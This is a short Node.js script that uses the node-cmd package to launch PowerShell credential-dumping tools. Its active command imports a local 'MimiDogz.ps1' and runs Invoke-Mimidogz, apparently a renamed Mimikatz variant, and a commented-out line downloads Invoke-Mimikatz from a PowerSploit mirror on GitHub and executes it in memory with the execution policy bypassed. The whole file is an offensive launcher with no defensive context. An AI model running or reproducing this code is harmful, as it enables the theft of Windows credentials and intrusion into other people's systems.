const os = require('os')
const cmd=require('node-cmd');
 
    cmd.get(
        // `Powershell.exe -NoP -NonI -Exec Bypass IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/cheetz/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz`,
        `Powershell.exe Import-Module ./MimiDogz.ps1; Invoke-Mimidogz`,
        function(err, data, stderr){
            if(err||stderr){
                console.log(err);
                console.log(stderr);
            }
            console.log(data);
        }
    );
 

